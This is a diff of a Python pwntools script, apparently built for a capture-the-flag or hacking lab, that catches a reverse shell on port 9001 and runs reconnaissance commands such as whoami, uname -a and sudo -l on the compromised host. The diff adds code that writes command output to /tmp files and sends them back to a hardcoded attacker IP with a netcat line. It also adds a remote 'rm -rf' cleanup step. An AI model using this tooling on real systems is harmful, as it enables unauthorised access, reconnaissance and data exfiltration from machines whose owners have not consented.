@@ -1,29 +1,36 @@
+import hashlib
+import subprocess
+import sys
 import pwn
 
+ATTACKER_IP = '10.10.14.7'
 EXPECTED_PROMPT = b'$ '
 LISTENING_PORT = 9001
+NETCAT_FILE_TRANSFER_PORT = 9002
 COMMAND_TIMEOUT = 1 # Waits at least 1 second when 'until' string doesn't match
+ENCODING = 'utf-8'
 
-# TODO: Instead of running a command directly and waiting for input
-#       Run command on system and output to a temporary file
-#       Download the file remotely (netcat, http server, etc)
-#       This should speed up a lot!
 def main():
-    commands = [
+    short_commands = [
         'whoami',
         'hostname',
         'uname -a',
-        'which nc',
-        'sudo -l' # TODO: Move longer output commands to the new 'remote download of output' thing
+        'which nc' # TODO: Verify if netcat exists. Do this for other tools and choose tools accordingly.
+    ]
+
+    long_commands = [
+        'sudo -l' # TODO: Add dependency to netcat
     ]
 
     commands_output = {}
     with pwn.listen(LISTENING_PORT).wait_for_connection() as client:
-        for command in commands:
-            output = send_command_read_output(client, command.encode())
+        for command in short_commands:
+            output = send_command_read_output(client, command.encode(), single_line_output=True)
             commands_output[command] = output
 
-        #client.interactive()
+        for command in long_commands:
+            output = send_command_read_cached_temporary_file(client, command)
+            commands_output[command] = output
     
     for command, output in commands_output.items():
         print(f'{command}\n--------\n{output}\n--------\n')
@@ -35,36 +42,52 @@ def ignore_until_prompt(client, prompt=EXPECTED_PROMPT):
 
     client.recvuntil(prompt)
 
-def send_command(client, command):
-    if not isinstance(command, bytes):
-        print('Command must be bytes')
-        exit()
-
-    client.sendline(command)
-
-def send_command_read_output(client, command, prompt=EXPECTED_PROMPT, timeout=COMMAND_TIMEOUT):
-    if not isinstance(command, bytes):
-        print('Command must be bytes')
-        exit()
-
-    if not isinstance(prompt, bytes):
-        print('Prompt must be bytes')
-        exit()
-
+def send_command_read_output(client, command, prompt=EXPECTED_PROMPT, timeout=COMMAND_TIMEOUT, single_line_output=False):
     ignore_until_prompt(client, prompt)
     client.sendline(command)
     client.recvuntil(b'\n')
 
     output = ''
     while True:
-        output_line = client.recvuntil(b'\n', timeout=timeout).decode('utf-8')
-        if not output_line:
-            break
-
+        output_line = client.recvuntil(b'\n', timeout=timeout).decode(ENCODING)
         output += output_line
+
+        if not output_line or single_line_output:
+            break
 
     return output.strip()
 
+def send_command_temporary_file(client, command):
+    hash_str = hashlib.md5(command.encode()).hexdigest()
+    output_remote_temporary_file = '/tmp/' + hash_str
+
+    if remote_file_exists(client, output_remote_temporary_file):
+        return output_remote_temporary_file
+
+    command = f'{command} > {output_remote_temporary_file}'.encode()
+    client.sendline(command)
+    return output_remote_temporary_file
+
+def download_remote_file(client, remote_path, attacker_ip=ATTACKER_IP, port=NETCAT_FILE_TRANSFER_PORT):
+    client.sendline(f'nc -w 3 {attacker_ip} {port} < {remote_path}'.encode())
+
+    downloaded_output = None
+    with pwn.listen(port).wait_for_connection() as client:
+        downloaded_output = client.recvall().strip()
+
+    return downloaded_output.decode(ENCODING)
+
+def delete_remote_file(client, remote_path):
+    client.sendline(f'rm -rf {remote_path}'.encode())
+
+def remote_file_exists(client, remote_path):
+    output = send_command_read_output(client, f'file {remote_path}'.encode(), single_line_output=True)
+    return 'No such file or directory' not in output
+
+def send_command_read_cached_temporary_file(client, command):
+    remote_temporary_file = send_command_temporary_file(client, command)
+    output = download_remote_file(client, remote_temporary_file)
+    return output
+
 if __name__ == '__main__':
     main()
-
